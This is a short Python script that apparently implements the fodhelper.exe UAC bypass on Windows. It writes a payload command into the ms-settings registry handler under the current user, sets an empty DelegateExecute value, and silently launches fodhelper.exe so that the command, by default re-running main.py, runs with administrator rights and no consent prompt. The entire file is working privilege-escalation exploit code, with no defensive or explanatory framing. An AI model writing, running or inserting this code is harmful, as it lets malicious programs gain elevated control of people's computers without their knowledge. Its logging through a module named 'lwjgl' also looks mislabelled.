import os
import winreg
import subprocess
import lwjgl
import sys

def UAC_Bypass(payload_cmd=""):
    if len(payload_cmd) == 0:
        payload_cmd = f'cmd.exe /c "cd /d "{os.getcwd()}" && "{sys.executable}" main.py"'
    try:
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        

        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except WindowsError:
            pass
        
   
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_cmd)
        
        winreg.CloseKey(key)
        
    except Exception as e:
        lwjgl.error(e)
        
    
    try:
        system32 = os.path.join(os.environ['WINDIR'], 'System32')
        fodhelper_path = os.path.join(system32, 'fodhelper.exe')
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.Popen([fodhelper_path], startupinfo=startupinfo, shell=True,start_new_session=True)
        lwjgl.info("Create Success")
        lwjgl.info("You can use Wnclient in a new window")
        sys.exit()
        
        
    except Exception as e:
        lwjgl.error(e)
        

    
if __name__ == "__main__":
    command = 'cmd.exe /k whoami && pause'
    UAC_Bypass("")